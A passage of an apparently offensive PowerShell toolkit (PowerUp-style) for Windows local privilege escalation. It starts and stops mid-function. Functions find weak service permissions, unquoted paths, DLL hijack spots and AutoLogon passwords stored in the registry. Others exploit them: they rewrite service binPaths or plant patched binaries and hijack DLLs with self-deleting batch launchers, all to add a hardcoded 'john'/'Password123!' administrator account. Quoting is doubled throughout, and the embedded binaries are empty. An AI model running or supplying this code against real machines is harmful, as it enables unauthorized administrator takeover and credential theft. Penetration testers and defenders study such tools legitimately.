        [ValidateSet('QueryConfig', 'ChangeConfig', 'QueryStatus', 'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', 'UserDefinedControl', 'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity', 'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead', 'AllAccess')]
        $Permissions,

        [String]
        [ValidateSet('ChangeConfig', 'Restart', 'AllAccess')]
        $PermissionSet = 'ChangeConfig'
    )

    BEGIN {
        $AccessMask = @{
            'QueryConfig'           = [uint32]'0x00000001'
            'ChangeConfig'          = [uint32]'0x00000002'
            'QueryStatus'           = [uint32]'0x00000004'
            'EnumerateDependents'   = [uint32]'0x00000008'
            'Start'                 = [uint32]'0x00000010'
            'Stop'                  = [uint32]'0x00000020'
            'PauseContinue'         = [uint32]'0x00000040'
            'Interrogate'           = [uint32]'0x00000080'
            'UserDefinedControl'    = [uint32]'0x00000100'
            'Delete'                = [uint32]'0x00010000'
            'ReadControl'           = [uint32]'0x00020000'
            'WriteDac'              = [uint32]'0x00040000'
            'WriteOwner'            = [uint32]'0x00080000'
            'Synchronize'           = [uint32]'0x00100000'
            'AccessSystemSecurity'  = [uint32]'0x01000000'
            'GenericAll'            = [uint32]'0x10000000'
            'GenericExecute'        = [uint32]'0x20000000'
            'GenericWrite'          = [uint32]'0x40000000'
            'GenericRead'           = [uint32]'0x80000000'
            'AllAccess'             = [uint32]'0x000F01FF'
        }

        $CheckAllPermissionsInSet = $False

        if($PSBoundParameters['Permissions']) {
            $TargetPermissions = $Permissions
        }
        else {
            if($PermissionSet -eq 'ChangeConfig') {
                $TargetPermissions = @('ChangeConfig', 'WriteDac', 'WriteOwner', 'GenericAll', ' GenericWrite', 'AllAccess')
            }
            elseif($PermissionSet -eq 'Restart') {
                $TargetPermissions = @('Start', 'Stop')
                $CheckAllPermissionsInSet = $True 
            }
            elseif($PermissionSet -eq 'AllAccess') {
                $TargetPermissions = @('GenericAll', 'AllAccess')
            }
        }
    }

    PROCESS {

        ForEach($IndividualService in $Name) {

            $TargetService = $IndividualService | Add-ServiceDacl

            if($TargetService -and $TargetService.Dacl) {

                
                $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
                $CurrentUserSids += $UserIdentity.User.Value

                ForEach($ServiceDacl in $TargetService.Dacl) {
                    if($CurrentUserSids -contains $ServiceDacl.SecurityIdentifier) {

                        if($CheckAllPermissionsInSet) {
                            $AllMatched = $True
                            ForEach($TargetPermission in $TargetPermissions) {
                                
                                if (($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -ne $AccessMask[$TargetPermission]) {
                                    
                                    $AllMatched = $False
                                    break
                                }
                            }
                            if($AllMatched) {
                                $TargetService
                            }
                        }
                        else {
                            ForEach($TargetPermission in $TargetPermissions) {
                                
                                if (($ServiceDacl.AceType -eq 'AccessAllowed') -and ($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -eq $AccessMask[$TargetPermission]) {
                                    Write-Verbose ""Current user has '$TargetPermission' for $IndividualService""
                                    $TargetService
                                    break
                                }
                            }
                        }
                    }
                }
            }
            else {
                Write-Verbose ""Error enumerating the Dacl for service $IndividualService""
            }
        }
    }
}








function Get-ServiceUnquoted {

    [CmdletBinding()] param()

    
    $VulnServices = Get-WmiObject -Class win32_service | Where-Object {$_} | Where-Object {($_.pathname -ne $null) -and ($_.pathname.trim() -ne '')} | Where-Object { (-not $_.pathname.StartsWith(""`"""")) -and (-not $_.pathname.StartsWith(""'""))} | Where-Object {($_.pathname.Substring(0, $_.pathname.ToLower().IndexOf("".exe"") + 4)) -match "".* .*""}

    if ($VulnServices) {
        ForEach ($Service in $VulnServices) {

            $ModifiableFiles = $Service.pathname.split(' ') | Get-ModifiablePath

            $ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
                $ServiceRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $Service.name

                if($ServiceRestart) {
                    $CanRestart = $True
                }
                else {
                    $CanRestart = $False
                }

                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceName' $Service.name
                $Out | Add-Member Noteproperty 'Path' $Service.pathname
                $Out | Add-Member Noteproperty 'ModifiablePath' $_
                $Out | Add-Member Noteproperty 'StartName' $Service.startname
                $Out | Add-Member Noteproperty 'AbuseFunction' ""Write-ServiceBinary -Name '$($Service.name)' -Path <HijackPath>""
                $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
                $Out
            }
        }
    }
}


function Get-ModifiableServiceFile {

    [CmdletBinding()] param()

    Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {

        $ServiceName = $_.name
        $ServicePath = $_.pathname
        $ServiceStartName = $_.startname

        $ServicePath | Get-ModifiablePath | ForEach-Object {

            $ServiceRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $ServiceName

            if($ServiceRestart) {
                $CanRestart = $True
            }
            else {
                $CanRestart = $False
            }

            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
            $Out | Add-Member Noteproperty 'Path' $ServicePath
            $Out | Add-Member Noteproperty 'ModifiableFile' $_.ModifiablePath
            $Out | Add-Member Noteproperty 'ModifiableFilePermissions' $_.Permissions
            $Out | Add-Member Noteproperty 'ModifiableFileIdentityReference' $_.IdentityReference
            $Out | Add-Member Noteproperty 'StartName' $ServiceStartName
            $Out | Add-Member Noteproperty 'AbuseFunction' ""Install-ServiceBinary -Name '$ServiceName'""
            $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
            $Out
        }
    }
}


function Get-ModifiableService {

    [CmdletBinding()] param()

    Get-Service | Test-ServiceDaclPermission -PermissionSet 'ChangeConfig' | ForEach-Object {

        $ServiceDetails = $_ | Get-ServiceDetail

        $ServiceRestart = $_ | Test-ServiceDaclPermission -PermissionSet 'Restart'

        if($ServiceRestart) {
            $CanRestart = $True
        }
        else {
            $CanRestart = $False
        }

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ServiceName' $ServiceDetails.name
        $Out | Add-Member Noteproperty 'Path' $ServiceDetails.pathname
        $Out | Add-Member Noteproperty 'StartName' $ServiceDetails.startname
        $Out | Add-Member Noteproperty 'AbuseFunction' ""Invoke-ServiceAbuse -Name '$($ServiceDetails.name)'""
        $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
        $Out
    }
}


function Get-ServiceDetail {


    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name
    )

    PROCESS {

        ForEach($IndividualService in $Name) {

            $TargetService = Get-Service -Name $IndividualService

            Get-WmiObject -Class win32_service -Filter ""Name='$($TargetService.Name)'"" | Where-Object {$_} | ForEach-Object {
                try {
                    $_
                }
                catch{
                    Write-Verbose ""Error: $_""
                    $null
                }
            }
        }
    }
}








function Invoke-ServiceAbuse {


    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name,

        [String]
        $UserName = 'john',

        [String]
        $Password = 'Password123!',

        [String]
        $LocalGroup = 'Administrators',

        [Management.Automation.PSCredential]
        $Credential,

        [String]
        [ValidateNotNullOrEmpty()]
        $Command,

        [Switch]
        $Force
    )

    BEGIN {

        if($PSBoundParameters['Command']) {
            $ServiceCommands = @($Command)
        }

        else {
            if($PSBoundParameters['Credential']) {
                $UserNameToAdd = $Credential.UserName
                $PasswordToAdd = $Credential.GetNetworkCredential().Password
            }
            else {
                $UserNameToAdd = $UserName
                $PasswordToAdd = $Password
            }

            if($UserNameToAdd.Contains('\')) {
                
                $ServiceCommands = @(""net localgroup $LocalGroup $UserNameToAdd /add"")
            }
            else {
                
                $ServiceCommands = @(""net user $UserNameToAdd $PasswordToAdd /add"", ""net localgroup $LocalGroup $UserNameToAdd /add"")
            }
        }
    }

    PROCESS {

        ForEach($IndividualService in $Name) {

            $TargetService = Get-Service -Name $IndividualService

            $ServiceDetails = $TargetService | Get-ServiceDetail

            $RestoreDisabled = $False
            if ($ServiceDetails.StartMode -match 'Disabled') {
                Write-Verbose ""Service '$(ServiceDetails.Name)' disabled, enabling...""
                $TargetService | Set-Service -StartupType Manual -ErrorAction Stop
                $RestoreDisabled = $True
            }

            $OriginalServicePath = $ServiceDetails.PathName
            $OriginalServiceState = $ServiceDetails.State

            Write-Verbose ""Service '$($TargetService.Name)' original path: '$OriginalServicePath'""
            Write-Verbose ""Service '$($TargetService.Name)' original state: '$OriginalServiceState'""

            ForEach($ServiceCommand in $ServiceCommands) {

                if($PSBoundParameters['Force']) {
                    $TargetService | Stop-Service -Force -ErrorAction Stop
                }
                else {
                    $TargetService | Stop-Service -ErrorAction Stop
                }

                Write-Verbose ""Executing command '$ServiceCommand'""

                $Success = $TargetService | Set-ServiceBinPath -binPath ""$ServiceCommand""

                if (-not $Success) {
                    throw ""Error reconfiguring the binPath for $($TargetService.Name)""
                }

                $TargetService | Start-Service -ErrorAction SilentlyContinue
                Start-Sleep -Seconds 2
            }

            if($PSBoundParameters['Force']) {
                $TargetService | Stop-Service -Force -ErrorAction Stop
            }
            else {
                $TargetService | Stop-Service -ErrorAction Stop
            }

            Write-Verbose ""Restoring original path to service '$($TargetService.Name)'""
            Start-Sleep -Seconds 1
            $Success = $TargetService | Set-ServiceBinPath -binPath ""$OriginalServicePath""

            if (-not $Success) {
                throw ""Error restoring the original binPath for $($TargetService.Name)""
            }

            
            if($RestoreDisabled) {
                Write-Verbose ""Re-disabling service '$($TargetService.Name)'""
                $TargetService | Set-Service -StartupType Disabled -ErrorAction Stop
            }
            elseif($OriginalServiceState -eq ""Paused"") {
                Write-Verbose ""Starting and then pausing service '$($TargetService.Name)'""
                $TargetService | Start-Service
                Start-Sleep -Seconds 1
                $TargetService | Set-Service -Status Paused -ErrorAction Stop
            }
            elseif($OriginalServiceState -eq ""Stopped"") {
                Write-Verbose ""Leaving service '$($TargetService.Name)' in stopped state""
            }
            else {
                Write-Verbose ""Restarting '$($TargetService.Name)'""
                $TargetService | Start-Service
            }

            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'ServiceAbused' $TargetService.Name
            $Out | Add-Member Noteproperty 'Command' $($ServiceCommands -join ' && ')
            $Out
        }
    }
}


function Write-ServiceBinary {


    Param(
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ServiceName')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [String]
        $UserName = 'john',

        [String]
        $Password = 'Password123!',

        [String]
        $LocalGroup = 'Administrators',

        [Management.Automation.PSCredential]
        $Credential,

        [String]
        [ValidateNotNullOrEmpty()]
        $Command,

        [String]
        $Path = ""$(Convert-Path .)\service.exe""
    )

    BEGIN {
        
        $B64Binary = ""
        [Byte[]] $Binary = [Byte[]][Convert]::FromBase64String($B64Binary)

        if($PSBoundParameters['Command']) {
            $ServiceCommand = $Command
        }
        else {
            if($PSBoundParameters['Credential']) {
                $UserNameToAdd = $Credential.UserName
                $PasswordToAdd = $Credential.GetNetworkCredential().Password
            }
            else {
                $UserNameToAdd = $UserName
                $PasswordToAdd = $Password
            }

            if($UserNameToAdd.Contains('\')) {
                
                $ServiceCommand = ""net localgroup $LocalGroup $UserNameToAdd /add""
            }
            else {
                
                $ServiceCommand = ""net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add""
            }
        }
    }

    PROCESS {

        $TargetService = Get-Service -Name $Name

        
        $Enc = [System.Text.Encoding]::Unicode
        $ServiceNameBytes = $Enc.GetBytes($TargetService.Name)
        $CommandBytes = $Enc.GetBytes($ServiceCommand)

        
        for ($i=0; $i -lt ($ServiceNameBytes.Length); $i++) {
            
            $Binary[$i+2458] = $ServiceNameBytes[$i]
        }
        for ($i=0; $i -lt ($CommandBytes.Length); $i++) {
            
            $Binary[$i+2535] = $CommandBytes[$i]
        }

        Set-Content -Value $Binary -Encoding Byte -Path $Path -Force -ErrorAction Stop

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ServiceName' $TargetService.Name
        $Out | Add-Member Noteproperty 'Path' $Path
        $Out | Add-Member Noteproperty 'Command' $ServiceCommand
        $Out
    }
}


function Install-ServiceBinary {


    Param(
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ServiceName')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [String]
        $UserName = 'john',

        [String]
        $Password = 'Password123!',

        [String]
        $LocalGroup = 'Administrators',

        [Management.Automation.PSCredential]
        $Credential,

        [String]
        [ValidateNotNullOrEmpty()]
        $Command
    )

    BEGIN {
        if($PSBoundParameters['Command']) {
            $ServiceCommand = $Command
        }
        else {
            if($PSBoundParameters['Credential']) {
                $UserNameToAdd = $Credential.UserName
                $PasswordToAdd = $Credential.GetNetworkCredential().Password
            }
            else {
                $UserNameToAdd = $UserName
                $PasswordToAdd = $Password
            }

            if($UserNameToAdd.Contains('\')) {
                
                $ServiceCommand = ""net localgroup $LocalGroup $UserNameToAdd /add""
            }
            else {
                
                $ServiceCommand = ""net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add""
            }
        }
    }

    PROCESS {

        $TargetService = Get-Service -Name $Name

        $ServiceDetails = $TargetService | Get-ServiceDetail

        $ModifiableFiles = $ServiceDetails.PathName | Get-ModifiablePath -LiteralPaths

        if(-not $ModifiableFiles) {
            throw ""Service binary '$($ServiceDetails.PathName)' for service $($ServiceDetails.Name) not modifiable by the current user.""
        }

        $ServicePath = $ModifiableFiles | Select-Object -First 1 | Select-Object -ExpandProperty ModifiablePath
        $BackupPath = ""$($ServicePath).bak""

        Write-Verbose ""Backing up '$ServicePath' to '$BackupPath'""

        try {
            Copy-Item -Path $ServicePath -Destination $BackupPath -Force
        }
        catch {
            Write-Warning ""Error backing up '$ServicePath' : $_""
        }

        $Result = Write-ServiceBinary -Name $ServiceDetails.Name -Command $ServiceCommand -Path $ServicePath
        $Result | Add-Member Noteproperty 'BackupPath' $BackupPath
        $Result
    }
}


function Restore-ServiceBinary {


    Param(
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ServiceName')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [Parameter(Position = 1)]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $BackupPath
    )

    PROCESS {

        $TargetService = Get-Service -Name $Name

        $ServiceDetails = $TargetService | Get-ServiceDetail

        $ModifiableFiles = $ServiceDetails.PathName | Get-ModifiablePath -LiteralPaths

        if(-not $ModifiableFiles) {
            throw ""Service binary '$($ServiceDetails.PathName)' for service $($ServiceDetails.Name) not modifiable by the current user.""
        }

        $ServicePath = $ModifiableFiles | Select-Object -First 1 | Select-Object -ExpandProperty ModifiablePath
        $BackupPath = ""$($ServicePath).bak""

        Copy-Item -Path $BackupPath -Destination $ServicePath -Force
        Remove-Item -Path $BackupPath -Force

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ServiceName' $ServiceDetails.Name
        $Out | Add-Member Noteproperty 'ServicePath' $ServicePath
        $Out | Add-Member Noteproperty 'BackupPath' $BackupPath
        $Out
    }
}








function Find-ProcessDLLHijack {


    [CmdletBinding()]
    Param(
        [Parameter(Position=0, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ProcessName')]
        [String[]]
        $Name = $(Get-Process | Select-Object -Expand Name),

        [Switch]
        $ExcludeWindows,

        [Switch]
        $ExcludeProgramFiles,

        [Switch]
        $ExcludeOwned
    )

    BEGIN {
        
        
        $Keys = (Get-Item ""HKLM:\System\CurrentControlSet\Control\Session Manager\KnownDLLs"")
        $KnownDLLs = $(ForEach ($KeyName in $Keys.GetValueNames()) { $Keys.GetValue($KeyName) }) | Where-Object { $_.EndsWith("".dll"") }
        $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

        
        $Owners = @{}
        Get-WmiObject -Class win32_process | Where-Object {$_} | ForEach-Object { $Owners[$_.handle] = $_.getowner().user }
    }

    PROCESS {

        ForEach ($ProcessName in $Name) {

            $TargetProcess = Get-Process -Name $ProcessName

            if($TargetProcess -and $TargetProcess.Path -and ($TargetProcess.Path -ne '') -and ($TargetProcess.Path -ne $Null)) {

                try {
                    $BasePath = $TargetProcess.Path | Split-Path -Parent

                    $LoadedModules = $TargetProcess.Modules

                    $ProcessOwner = $Owners[$TargetProcess.Id.ToString()]

                    ForEach ($Module in $LoadedModules){

                        $ModulePath = ""$BasePath\$($Module.ModuleName)""

                        
                        if ((-not $ModulePath.Contains('C:\Windows\System32')) -and (-not (Test-Path -Path $ModulePath)) -and ($KnownDLLs -NotContains $Module.ModuleName)) {

                            $Exclude = $False

                            if($PSBoundParameters['ExcludeWindows'] -and $ModulePath.Contains('C:\Windows')) {
                                $Exclude = $True
                            }

                            if($PSBoundParameters['ExcludeProgramFiles'] -and $ModulePath.Contains('C:\Program Files')) {
                                $Exclude = $True
                            }

                            if($PSBoundParameters['ExcludeOwned'] -and $CurrentUser.Contains($ProcessOwner)) {
                                $Exclude = $True
                            }

                            
                            if (-not $Exclude){
                                $Out = New-Object PSObject
                                $Out | Add-Member Noteproperty 'ProcessName' $TargetProcess.ProcessName
                                $Out | Add-Member Noteproperty 'ProcessPath' $TargetProcess.Path
                                $Out | Add-Member Noteproperty 'ProcessOwner' $ProcessOwner
                                $Out | Add-Member Noteproperty 'ProcessHijackableDLL' $ModulePath
                                $Out
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose ""Error: $_""
                }
            }
        }
    }
}


function Find-PathDLLHijack {


    [CmdletBinding()]
    Param()

    
    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
        $TargetPath = $_

        $ModifidablePaths = $TargetPath | Get-ModifiablePath -LiteralPaths | Where-Object {$_ -and ($_ -ne $Null) -and ($_.ModifiablePath -ne $Null) -and ($_.ModifiablePath.Trim() -ne '')}
        ForEach($ModifidablePath in $ModifidablePaths) {
            if($ModifidablePath.ModifiablePath -ne $Null) {
                $ModifidablePath | Add-Member Noteproperty '%PATH%' $_
                $ModifidablePath
            }
        }
    }
}


function Write-HijackDll {


    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $DllPath,

        [String]
        [ValidateSet('x86', 'x64')]
        $Architecture,

        [String]
        [ValidateNotNullOrEmpty()]
        $BatPath,

        [String]
        $UserName = 'john',

        [String]
        $Password = 'Password123!',

        [String]
        $LocalGroup = 'Administrators',

        [Management.Automation.PSCredential]
        $Credential,

        [String]
        [ValidateNotNullOrEmpty()]
        $Command
    )

    function local:Invoke-PatchDll {
    

        [CmdletBinding()]
        param(
            [Parameter(Mandatory=$True)]
            [Byte[]]
            $DllBytes,

            [Parameter(Mandatory=$True)]
            [String]
            $SearchString,

            [Parameter(Mandatory=$True)]
            [String]
            $ReplaceString
        )

        $ReplaceStringBytes = ([System.Text.Encoding]::UTF8).GetBytes($ReplaceString)

        $Index = 0
        $S = [System.Text.Encoding]::ASCII.GetString($DllBytes)
        $Index = $S.IndexOf($SearchString)

        if($Index -eq 0) {
            throw(""Could not find string $SearchString !"")
        }

        for ($i=0; $i -lt $ReplaceStringBytes.Length; $i++) {
            $DllBytes[$Index+$i]=$ReplaceStringBytes[$i]
        }

        return $DllBytes
    }

    if($PSBoundParameters['Command']) {
        $BatCommand = $Command
    }
    else {
        if($PSBoundParameters['Credential']) {
            $UserNameToAdd = $Credential.UserName
            $PasswordToAdd = $Credential.GetNetworkCredential().Password
        }
        else {
            $UserNameToAdd = $UserName
            $PasswordToAdd = $Password
        }

        if($UserNameToAdd.Contains('\')) {
            
            $BatCommand = ""net localgroup $LocalGroup $UserNameToAdd /add""
        }
        else {
            
            $BatCommand = ""net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add""
        }
    }

    
    $DllBytes32 = ""
    $DllBytes64 = ""

    if($PSBoundParameters['Architecture']) {
        $TargetArchitecture = $Architecture
    }
    elseif($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {
        $TargetArchitecture = 'x64'
    }
    else {
        $TargetArchitecture = 'x86'
    }

    if($TargetArchitecture -eq 'x64') {
        [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes64)
    }
    else {
        [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes32)
    }

    if($PSBoundParameters['BatPath']) {
        $TargetBatPath = $BatPath
    }
    else {
        $BasePath = $DllPath | Split-Path -Parent
        $TargetBatPath = ""$BasePath\debug.bat""
    }

    
    $DllBytes = Invoke-PatchDll -DllBytes $DllBytes -SearchString 'debug.bat' -ReplaceString $TargetBatPath

    
    if (Test-Path $TargetBatPath) { Remove-Item -Force $TargetBatPath }

    ""@echo off"" | Out-File -Encoding ASCII -Append $TargetBatPath
    ""start /b $BatCommand"" | Out-File -Encoding ASCII -Append $TargetBatPath
    'start /b """" cmd /c del ""%~f0""&exit /b' | Out-File -Encoding ASCII -Append $TargetBatPath

    Write-Verbose "".bat launcher written to: $TargetBatPath""

    Set-Content -Value $DllBytes -Encoding Byte -Path $DllPath
    Write-Verbose ""$TargetArchitecture DLL Hijacker written to: $DllPath""

    $Out = New-Object PSObject
    $Out | Add-Member Noteproperty 'DllPath' $DllPath
    $Out | Add-Member Noteproperty 'Architecture' $TargetArchitecture
    $Out | Add-Member Noteproperty 'BatLauncherPath' $TargetBatPath
    $Out | Add-Member Noteproperty 'Command' $BatCommand
    $Out
}








function Get-RegistryAlwaysInstallElevated {


    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = ""SilentlyContinue""

    if (Test-Path ""HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer"") {

        $HKLMval = (Get-ItemProperty -Path ""HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer"" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
        Write-Verbose ""HKLMval: $($HKLMval.AlwaysInstallElevated)""

        if ($HKLMval.AlwaysInstallElevated -and ($HKLMval.AlwaysInstallElevated -ne 0)){

            $HKCUval = (Get-ItemProperty -Path ""HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer"" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
            Write-Verbose ""HKCUval: $($HKCUval.AlwaysInstallElevated)""

            if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){
                Write-Verbose ""AlwaysInstallElevated enabled on this machine!""
                $True
            }
            else{
                Write-Verbose ""AlwaysInstallElevated not enabled on this machine.""
                $False
            }
        }
        else{
            Write-Verbose ""AlwaysInstallElevated not enabled on this machine.""
            $False
        }
    }
    else{
        Write-Verbose ""HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer does not exist""
        $False
    }

    $ErrorActionPreference = $OrigError
}


function Get-RegistryAutoLogon {


    [CmdletBinding()]
    Param()

    $AutoAdminLogon = $(Get-ItemProperty -Path ""HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name AutoAdminLogon -ErrorAction SilentlyContinue)

    Write-Verbose ""AutoAdminLogon key: $($AutoAdminLogon.AutoAdminLogon)""

    if ($AutoAdminLogon -and ($AutoAdminLogon.AutoAdminLogon -ne 0)) {

        $DefaultDomainName = $(Get-ItemProperty -Path ""HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
        $DefaultUserName = $(Get-ItemProperty -Path ""HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
        $DefaultPassword = $(Get-ItemProperty -Path ""HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
        $AltDefaultDomainName = $(Get-ItemProperty -Path ""HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
        $AltDefaultUserName = $(Get-ItemProperty -Path ""HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
        $AltDefaultPassword = $(Get-ItemProperty -Path ""HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword

        if ($DefaultUserName -or $AltDefaultUserName) {
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'DefaultDomainName' $DefaultDomainName
            $Out | Add-Member Noteproperty 'DefaultUserName' $DefaultUserName
            $Out | Add-Member Noteproperty 'DefaultPassword' $DefaultPassword
            $Out | Add-Member Noteproperty 'AltDefaultDomainName' $AltDefaultDomainName
            $Out | Add-Member Noteproperty 'AltDefaultUserName' $AltDefaultUserName
            $Out | Add-Member Noteproperty 'AltDefaultPassword' $AltDefaultPassword
            $Out
        }
    }
}

function Get-ModifiableRegistryAutoRun {


    [CmdletBinding()]
    Param()

    $SearchLocations = @(   ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"",
                            ""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"",
                            ""HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"",
                            ""HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce"",
                            ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService"",
                            ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService"",
                            ""HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService"",
                            ""HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService""
                        )

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = ""SilentlyContinue""

    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {

        $Keys = Get-Item -Path $_
        $ParentPath = $_

        ForEach ($Name in $Keys.GetValueNames()) {

            $Path = $($Keys.GetValue($Name))

            $Path | Get-ModifiablePath | ForEach-Object {
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'Key' ""$ParentPath\$Name""
                $Out | Add-Member Noteproperty 'Path' $Path
                $Out | Add-Member Noteproperty 'ModifiableFile' $_
                $Out
            }
        }
    }

    $ErrorActionPreference = $OrigError
}








function Get-ModifiableScheduledTaskFile {


    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = ""SilentlyContinue""

    $Path = ""$($ENV:windir)\System32\Tasks""

    
    Get-ChildItem -Path $Path -Recurse | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
        try {
            $TaskName = $_.Name
            $TaskXML = [xml] (Get-Content $_.FullName)
            if($TaskXML.Task.Triggers) {

                $TaskTrigger = $TaskXML.Task.Triggers.OuterXML

                
                $TaskXML.Task.Actions.Exec.Command | Get-ModifiablePath | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
                    $Out
                }

                
                $TaskXML.Task.Actions.Exec.Arguments | Get-ModifiablePath | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
                    $Out
                }
            }
        }
        catch {
            Write-Verbose ""Error: $_""
        }
    }

    $ErrorActionPreference = $OrigError
}


function Get-UnattendedInstallFile {


    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = ""SilentlyContinue""

    $SearchLocations = @(   ""c:\sysprep\sysprep.xml"",
                            ""c:\sysprep\sysprep.inf"",
                            ""c:\sysprep.inf"",
                            (Join-Path $Env:WinDir ""\Panther\Unattended.xml""),
                            (Join-Path $Env:WinDir ""\Panther\Unattend\Unattended.xml""),
                            (Join-Path $Env:WinDir ""\Panther\Unattend.xml""),
                            (Join-Path $Env:WinDir ""\Panther\Unattend\Unattend.xml""),
                            (Join-Path $Env:WinDir ""\System32\Sysprep\unattend.xml""),
                            (Join-Path $Env:WinDir ""\System32\Sysprep\Panther\unattend.xml"")
                        )

    
    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'UnattendPath' $_
        $Out
    }

    $ErrorActionPreference = $OrigError
}


function Get-WebConfig {


    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = ""SilentlyContinue""

    
    if (Test-Path  (""$Env:SystemRoot\System32\InetSRV\appcmd.exe"")) {

        
        $DataTable = New-Object System.Data.DataTable

        
        $Null = $DataTable.Columns.Add(""user"")
        $Null = $DataTable.Columns.Add(""pass"")
